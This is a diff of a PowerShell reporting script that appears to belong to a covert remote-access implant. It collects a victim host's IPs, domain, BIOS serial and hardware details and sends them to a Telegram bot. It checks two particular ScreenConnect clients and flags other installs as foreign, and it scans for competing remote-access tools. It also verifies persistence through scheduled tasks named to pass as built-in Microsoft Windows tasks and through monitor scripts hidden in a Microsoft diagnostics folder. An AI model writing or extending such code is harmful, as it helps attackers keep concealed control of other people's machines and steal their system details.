@@ -1,5 +1,5 @@
 #Requires -Version 5.1
-# TG_REPORT BUILD 20260802T3 - rich SC alerts (HTML + UTF-8 JSON)
+# TG_REPORT BUILD 20260802T4 - rich SC alerts + first-deploy inventory
 param(
     [Parameter(Mandatory = $true)][string]$State,
     [Parameter(Mandatory = $true)][string]$Summary,
@@ -9,6 +9,7 @@ param(
 
 $ErrorActionPreference = 'SilentlyContinue'
 $ProgressPreference = 'SilentlyContinue'
+try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
 
 function Get-Cfg {
     $path = Join-Path $WorkDir 'notify.cfg'
@@ -29,10 +30,10 @@ function Esc([string]$s) {
 
 function Get-PublicIp {
     foreach ($u in @(
-        'https://api.ipify.org',
-        'https://ifconfig.me/ip',
-        'https://icanhazip.com'
-    )) {
+            'https://api.ipify.org',
+            'https://ifconfig.me/ip',
+            'https://icanhazip.com'
+        )) {
         try {
             $r = Invoke-WebRequest -Uri $u -UseBasicParsing -TimeoutSec 6
             $ip = ($r.Content | Out-String).Trim()
@@ -50,53 +51,194 @@ function Get-LocalIps {
         if ($ips) { return ($ips -join ', ') }
     } catch {}
     try {
-        $ips = [System.Net.Dns]::GetHostAddresses($env:COMPUTERNAME) |
-            Where-Object { $_.AddressFamily -eq 'InterNetwork' -and $_.IPAddressToString -notlike '127.*' } |
-            ForEach-Object { $_.IPAddressToString }
-        if ($ips) { return ($ips -join ', ') }
+        $ips = Get-CimInstance Win32_NetworkAdapterConfiguration -Filter 'IPEnabled=True' |
+            ForEach-Object { $_.IPAddress } | Where-Object { $_ -and $_ -notlike '127.*' -and $_ -notlike '*:*' }
+        if ($ips) { return (($ips | Select-Object -Unique) -join ', ') }
     } catch {}
     return 'n/a'
 }
 
-function Get-SvcLine([string]$Name) {
-    $s = Get-Service -Name $Name -ErrorAction SilentlyContinue
-    if (-not $s) { return 'missing' }
-    $cim = Get-CimInstance Win32_Service -Filter "Name='$Name'" -ErrorAction SilentlyContinue
-    $start = if ($cim) { $cim.StartMode } else { '?' }
-    $path = if ($cim -and $cim.PathName) {
-        $p = $cim.PathName
-        if ($p.Length -gt 90) { $p.Substring(0, 90) + '...' } else { $p }
-    } else { '' }
-    if ($path) { return "$($s.Status) (start=$start) | $path" }
-    return "$($s.Status) (start=$start)"
+function Get-OsInfo {
+    $o = [ordered]@{
+        Caption = 'n/a'; Version = 'n/a'; Build = 'n/a'; Arch = 'n/a'
+        Domain = 'n/a'; InstallDate = 'n/a'; LastBoot = 'n/a'
+        CPU = 'n/a'; Manufacturer = 'n/a'; Model = 'n/a'; Serial = 'n/a'
+        TotalRAM_GB = 'n/a'; DiskFree_GB = 'n/a'; DiskSize_GB = 'n/a'
+    }
+    try {
+        $os = Get-CimInstance Win32_OperatingSystem
+        $o.Caption = $os.Caption
+        $o.Version = $os.Version
+        $o.Build = $os.BuildNumber
+        $o.Arch = $os.OSArchitecture
+        $o.InstallDate = ($os.InstallDate | Get-Date -Format 'yyyy-MM-dd')
+        $o.LastBoot = ($os.LastBootUpTime | Get-Date -Format 'yyyy-MM-dd HH:mm')
+        $o.TotalRAM_GB = [math]::Round($os.TotalVisibleMemorySize / 1MB, 1)
+    } catch {}
+    try {
+        $cs = Get-CimInstance Win32_ComputerSystem
+        $o.Domain = if ($cs.PartOfDomain) { $cs.Domain } else { $cs.Workgroup }
+        $o.Manufacturer = $cs.Manufacturer
+        $o.Model = $cs.Model
+    } catch {}
+    try {
+        $o.CPU = (Get-CimInstance Win32_Processor | Select-Object -First 1 -ExpandProperty Name)
+    } catch {}
+    try {
+        $o.Serial = (Get-CimInstance Win32_BIOS).SerialNumber
+    } catch {}
+    try {
+        $d = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'"
+        $o.DiskFree_GB = [math]::Round($d.FreeSpace / 1GB, 1)
+        $o.DiskSize_GB = [math]::Round($d.Size / 1GB, 1)
+    } catch {}
+    return $o
 }
 
-function Get-OsInfo {
-    $os = Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue
-    $cs = Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue
-    $bios = Get-CimInstance Win32_BIOS -ErrorAction SilentlyContinue
-    $cpu = Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1
-    $disk = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'" -ErrorAction SilentlyContinue
-    [pscustomobject]@{
-        Caption      = if ($os) { $os.Caption } else { 'n/a' }
-        Version      = if ($os) { $os.Version } else { 'n/a' }
-        Build        = if ($os) { $os.BuildNumber } else { 'n/a' }
-        Arch         = if ($os) { $os.OSArchitecture } else { $env:PROCESSOR_ARCHITECTURE }
-        InstallDate  = if ($os -and $os.InstallDate) { $os.InstallDate.ToString('yyyy-MM-dd') } else { 'n/a' }
-        LastBoot     = if ($os -and $os.LastBootUpTime) { $os.LastBootUpTime.ToString('yyyy-MM-dd HH:mm') } else { 'n/a' }
-        Manufacturer = if ($cs) { $cs.Manufacturer } else { 'n/a' }
-        Model        = if ($cs) { $cs.Model } else { 'n/a' }
-        Domain       = if ($cs) { $cs.Domain } else { 'n/a' }
-        TotalRAM_GB  = if ($cs) { [math]::Round($cs.TotalPhysicalMemory / 1GB, 1) } else { 'n/a' }
-        Serial       = if ($bios) { $bios.SerialNumber } else { 'n/a' }
-        CPU          = if ($cpu) { $cpu.Name } else { 'n/a' }
-        DiskFree_GB  = if ($disk) { [math]::Round($disk.FreeSpace / 1GB, 1) } else { 'n/a' }
-        DiskSize_GB  = if ($disk) { [math]::Round($disk.Size / 1GB, 1) } else { 'n/a' }
+function Get-SvcLine([string]$name) {
+    $s = Get-Service -Name $name -ErrorAction SilentlyContinue
+    if (-not $s) { return 'NOT INSTALLED' }
+    return ('{0} (Start={1})' -f $s.Status, $s.StartType)
+}
+
+function Get-TaskHealth([string]$tn) {
+    $out = & schtasks.exe /Query /TN $tn /FO LIST /V 2>$null
+    if ($LASTEXITCODE -ne 0 -or -not $out) {
+        return @{ Present = $false; Status = 'MISSING'; Next = ''; Last = ''; Result = '' }
+    }
+    $map = @{}
+    foreach ($line in $out) {
+        if ($line -match '^\s*([^:]+):\s*(.*)\s*$') {
+            $map[$matches[1].Trim()] = $matches[2].Trim()
+        }
+    }
+    $status = $map['Status']
+    if (-not $status) { $status = $map['Task Status'] }
+    if (-not $status) { $status = 'present' }
+    $next = $map['Next Run Time']
+    if (-not $next) { $next = '' }
+    $last = $map['Last Run Time']
+    if (-not $last) { $last = '' }
+    $result = $map['Last Result']
+    if (-not $result) { $result = '' }
+    $healthy = ($status -match 'Ready|Running') -or ($status -eq 'present')
+    return @{
+        Present = $true
+        Healthy = [bool]$healthy
+        Status  = $status
+        Next    = $next
+        Last    = $last
+        Result  = $result
     }
 }
 
+function Get-RmmHits {
+    $tokens = @(
+        'AnyDesk', 'TeamViewer', 'tvnserver', 'DWAgent', 'DWService', 'LogMeIn', 'LMIGuardian',
+        'WinVNC', 'vncserver', 'tv_', 'Splashtop', 'Zoho', 'RustDesk', 'RemotePC', 'DameWare',
+        'AteraAgent', 'Atera', 'NinjaRMM', 'NinjaOne', 'Ninja', 'Kaseya', 'Pulseway', 'Syncro',
+        'SuperOps', 'ManageEngine', 'SolarWinds', 'ConnectWise', 'LTService', 'LabTech',
+        'Action1', 'SimpleHelp', 'Bomgar', 'BeyondTrust', 'MeshAgent', 'Mesh Central',
+        'TacticalRMM', 'tacticalrmm',         'GetScreen', 'Supremo', 'rutserv', 'remoting_host',
+        'Chrome Remote Desktop', 'Parsec', 'NetSupport', 'Level.io', 'Level Agent',
+        'Datto RMM', 'Continuum'
+    )
+    $hits = New-Object System.Collections.Generic.List[string]
+    $seen = @{}
+
+    function Add-Hit([string]$kind, [string]$name) {
+        $key = "$kind|$name".ToLowerInvariant()
+        if ($seen.ContainsKey($key)) { return }
+        $seen[$key] = $true
+        [void]$hits.Add(('- [{0}] <code>{1}</code>' -f $kind, (Esc $name)))
+    }
+
+    Get-Service -ErrorAction SilentlyContinue | ForEach-Object {
+        $n = $_.Name
+        $d = $_.DisplayName
+        if ($n -like 'ScreenConnect Client*') { return }
+        foreach ($t in $tokens) {
+            if ($n -like "*$t*" -or $d -like "*$t*") {
+                Add-Hit 'svc' ("$n ($($_.Status))")
+                break
+            }
+        }
+    }
+
+    Get-Process -ErrorAction SilentlyContinue | ForEach-Object {
+        $n = $_.ProcessName
+        if ($n -like '*ScreenConnect*') { return }
+        foreach ($t in $tokens) {
+            if ($n -like "*$t*") {
+                Add-Hit 'proc' $n
+                break
+            }
+        }
+    }
+
+    $uninst = @(
+        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*',
+        'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*'
+    )
+    foreach ($path in $uninst) {
+        Get-ItemProperty $path -ErrorAction SilentlyContinue | ForEach-Object {
+            $dn = [string]$_.DisplayName
+            if (-not $dn) { return }
+            if ($dn -like '*ScreenConnect*') { return }
+            foreach ($t in $tokens) {
+                if ($dn -like "*$t*") {
+                    Add-Hit 'msi' $dn
+                    break
+                }
+            }
+        }
+    }
+
+    return $hits
+}
+
+function Get-ScInstalls {
+    $list = New-Object System.Collections.Generic.List[string]
+    Get-Service -ErrorAction SilentlyContinue | Where-Object { $_.Name -like 'ScreenConnect Client*' } | ForEach-Object {
+        $fp = if ($_.Name -match '\(([0-9a-f]{16})\)') { $matches[1] } else { '?' }
+        $tag = if ($fp -eq '5f6010579852e507') { 'KEEP-PRIMARY' }
+        elseif ($fp -eq 'f861c8140d453427') { 'KEEP-ALT' }
+        else { 'FOREIGN' }
+        [void]$list.Add(('- <code>{0}</code>: <b>{1}</b> [{2}]' -f (Esc $_.Name), (Esc ([string]$_.Status)), $tag))
+    }
+
+    $roots = @(
+        "${env:ProgramFiles}\ScreenConnect Client*",
+        "${env:ProgramFiles(x86)}\ScreenConnect Client*"
+    )
+    foreach ($pat in $roots) {
+        Get-ChildItem -Path $pat -Directory -ErrorAction SilentlyContinue | ForEach-Object {
+            [void]$list.Add(('- path: <code>{0}</code>' -f (Esc $_.FullName)))
+        }
+    }
+
+    $uninst = @(
+        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*',
+        'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*'
+    )
+    foreach ($path in $uninst) {
+        Get-ItemProperty $path -ErrorAction SilentlyContinue | Where-Object {
+            $_.DisplayName -like '*ScreenConnect*'
+        } | ForEach-Object {
+            $ver = if ($_.DisplayVersion) { $_.DisplayVersion } else { '?' }
+            [void]$list.Add(('- msi: <code>{0}</code> v{1}' -f (Esc $_.DisplayName), (Esc $ver)))
+        }
+    }
+
+    if ($list.Count -eq 0) { [void]$list.Add('- (none)') }
+    return $list
+}
+
 $cfg = Get-Cfg
-if (-not $cfg.BOT_TOKEN -or -not $cfg.CHAT_ID) { exit 0 }
+if (-not $cfg.BOT_TOKEN -or -not $cfg.CHAT_ID) {
+    Add-Content -LiteralPath (Join-Path $WorkDir 'boot.err') -Value 'tg_skip_no_cfg' -ErrorAction SilentlyContinue
+    exit 2
+}
 
 $prim = 'ScreenConnect Client (5f6010579852e507)'
 $alt = 'ScreenConnect Client (f861c8140d453427)'
@@ -111,12 +253,55 @@ $msiSize = if (Test-Path $msiCache) {
     '{0:N0} KB' -f ((Get-Item $msiCache).Length / 1KB)
 } else { 'none' }
 
+$monPath = Join-Path $WorkDir 'own_mon.cmd'
+$etlMon = "$env:ProgramData\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd"
+$hasMon = Test-Path $monPath
+$hasEtl = Test-Path $etlMon
+
+$expectedTasks = @(
+    @{ Name = '\Microsoft\Windows\Diagnosis\Scheduled'; Role = 'tick 2m (own_mon)' },
+    @{ Name = '\Microsoft\Windows\PLA\Server'; Role = 'backup 3m (etl_mon)' },
+    @{ Name = '\Microsoft\Windows\WDI\ResolutionHost'; Role = 'ONSTART' },
+    @{ Name = '\Microsoft\Windows\Tcpip\IpAddressConflict1'; Role = 'ONLOGON' }
+)
+
+$taskLines = New-Object System.Collections.Generic.List[string]
+$taskOk = 0
+$taskBad = 0
+foreach ($t in $expectedTasks) {
+    $h = Get-TaskHealth $t.Name
+    if ($h.Present -and $h.Healthy) {
+        $taskOk++
+        $mark = 'OK'
+    } elseif ($h.Present) {
+        $taskBad++
+        $mark = 'WEAK'
+    } else {
+        $taskBad++
+        $mark = 'MISSING'
+    }
+    $extra = ''
+    if ($h.Present) {
+        $bits = @()
+        if ($h.Status) { $bits += $h.Status }
+        if ($h.Result -ne '' -and $h.Result -ne '0') { $bits += ("LastResult=" + $h.Result) }
+        if ($bits.Count) { $extra = ' (' + ($bits -join ', ') + ')' }
+    }
+    [void]$taskLines.Add(('- [{0}] <code>{1}</code> - {2}{3}' -f $mark, (Esc $t.Name), (Esc $t.Role), (Esc $extra)))
+}
+
+$primLine = Get-SvcLine $prim
+$altLine = Get-SvcLine $alt
+$primOk = $primLine -like 'Running*'
+$deployOk = $primOk -and ($taskOk -ge 3) -and $hasMon
+
 $emojiMap = @{
     OK       = [string]([char]0x2705)
     DOWN     = ([string][char]::ConvertFromUtf32(0x1F6A8))
     RESTORED = ([string][char]::ConvertFromUtf32(0x1F7E2))
     FAIL     = [string]([char]0x274C)
     FORCE    = [string]([char]0x26A1)
+    DEPLOY   = ([string][char]::ConvertFromUtf32(0x1F680))
 }
 $key = $State.ToUpperInvariant()
 $emoji = if ($emojiMap.ContainsKey($key)) { $emojiMap[$key] } else { ([string][char]::ConvertFromUtf32(0x1F4F1)) }
@@ -127,28 +312,14 @@ $title = switch ($key) {
     'RESTORED' { 'Primary RESTORED' }
     'FAIL' { 'Heal FAILED' }
     'FORCE' { 'Forced reinstall' }
+    'DEPLOY' { if ($deployOk) { 'FIRST DEPLOY OK' } else { 'FIRST DEPLOY - CHECK NEEDED' } }
     default { "State: $State" }
 }
 
 $trans = if ($OldState) { "$OldState -> $State" } else { $State }
-
-$scList = New-Object System.Collections.Generic.List[string]
-Get-Service -ErrorAction SilentlyContinue | Where-Object { $_.Name -like 'ScreenConnect Client*' } | ForEach-Object {
-    [void]$scList.Add(('- <code>{0}</code>: <b>{1}</b>' -f (Esc $_.Name), (Esc ([string]$_.Status))))
-}
-if ($scList.Count -eq 0) { [void]$scList.Add('- (none)') }
-
-$taskLines = New-Object System.Collections.Generic.List[string]
-foreach ($tn in @(
-        '\Microsoft\Windows\Diagnosis\Scheduled',
-        '\Microsoft\Windows\PLA\Server',
-        '\Microsoft\Windows\WDI\ResolutionHost',
-        '\Microsoft\Windows\Tcpip\IpAddressConflict1'
-    )) {
-    schtasks.exe /Query /TN $tn /FO LIST 1>$null 2>$null
-    $st = if ($LASTEXITCODE -eq 0) { 'present' } else { 'missing' }
-    [void]$taskLines.Add(('- <code>{0}</code>: {1}' -f (Esc $tn), $st))
-}
+$scList = Get-ScInstalls
+$rmmHits = Get-RmmHits
+if ($rmmHits.Count -eq 0) { [void]$rmmHits.Add('- (none detected)') }
 
 $pub = Get-PublicIp
 $lan = Get-LocalIps
@@ -159,6 +330,21 @@ try {
     $uptime = '{0:dd}d {0:hh}h {0:mm}m' -f ((Get-Date) - $boot)
 } catch {}
 
+$deployBlock = ''
+if ($key -eq 'DEPLOY') {
+    $verdict = if ($deployOk) { 'DEPLOYED / HEALTHY' } else { 'DEPLOYED BUT INCOMPLETE' }
+    $deployBlock = @"
+
+<b>Deploy verdict</b>
+- Result: <b>$(Esc $verdict)</b>
+- Primary Running: $(if ($primOk) { 'YES' } else { 'NO' })
+- Monitor script (.wucache\own_mon.cmd): $(if ($hasMon) { 'YES' } else { 'NO' })
+- Backup mon (.etlcache\etl_mon.cmd): $(if ($hasEtl) { 'YES' } else { 'NO' })
+- Persist tasks OK: $taskOk / $($expectedTasks.Count) (bad/missing: $taskBad)
+- MSI cache: $(Esc $msiSize)
+"@
+}
+
 $text = @"
 $emoji <b>SC Monitor - $(Esc $title)</b>
 
@@ -166,6 +352,7 @@ $emoji <b>SC Monitor - $(Esc $title)</b>
 - Summary: $(Esc $Summary)
 - Transition: <code>$(Esc $trans)</code>
 - When: $(Esc $now)
+$deployBlock
 
 <b>Host</b>
 - Computer: <code>$(Esc $env:COMPUTERNAME)</code>
@@ -188,19 +375,22 @@ $emoji <b>SC Monitor - $(Esc $title)</b>
 - RAM: $($os.TotalRAM_GB) GB
 - Disk C: $($os.DiskFree_GB) GB free / $($os.DiskSize_GB) GB
 
-<b>ScreenConnect</b>
-- Primary <code>5f6010579852e507</code>: $(Esc (Get-SvcLine $prim))
-- Alt <code>f861c8140d453427</code>: $(Esc (Get-SvcLine $alt))
-- All SC services:
+<b>ScreenConnect (all)</b>
+- Primary <code>5f6010579852e507</code>: $(Esc $primLine)
+- Alt <code>f861c8140d453427</code>: $(Esc $altLine)
 $($scList -join "`n")
 
-<b>Persist / Cache</b>
-- MSI cache: $(Esc $msiSize)
-- WorkDir: <code>$(Esc $WorkDir)</code>
-- Tasks:
+<b>Other RMM / remote tools</b>
+$($rmmHits -join "`n")
+
+<b>Persist tasks (expected)</b>
 $($taskLines -join "`n")
 
-<i>Bot: @nobuddyrmmBot | OWN_MON rich report</i>
+<b>Cache</b>
+- MSI cache: $(Esc $msiSize)
+- WorkDir: <code>$(Esc $WorkDir)</code>
+
+<i>Bot: @nobuddyrmmBot | TG_REPORT T4</i>
 "@
 
 $log = Join-Path $WorkDir 'boot.err'
@@ -212,7 +402,6 @@ function Send-Tg([string]$msg, [string]$mode) {
     }
     if ($mode) { $payload.parse_mode = $mode }
     $json = $payload | ConvertTo-Json -Compress -Depth 5
-    # Force UTF-8 body so emoji survive (form-urlencoded mangles them)
     $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
     Invoke-RestMethod -Uri ("https://api.telegram.org/bot$($cfg.BOT_TOKEN)/sendMessage") `
         -Method Post -Body $bytes -ContentType 'application/json; charset=utf-8' | Out-Null
@@ -221,6 +410,10 @@ function Send-Tg([string]$msg, [string]$mode) {
 try {
     Send-Tg -msg $text -mode 'HTML'
     Add-Content -LiteralPath $log -Value 'tg_sent_rich' -ErrorAction SilentlyContinue
+    if ($key -eq 'DEPLOY') {
+        Add-Content -LiteralPath $log -Value ("tg_deploy_ok=" + $deployOk) -ErrorAction SilentlyContinue
+        Set-Content -LiteralPath (Join-Path $WorkDir 'deploy_tg.flag') -Value (Get-Date -Format 'o') -ErrorAction SilentlyContinue
+    }
 } catch {
     try {
         $plain = [regex]::Replace($text, '<[^>]+>', '')
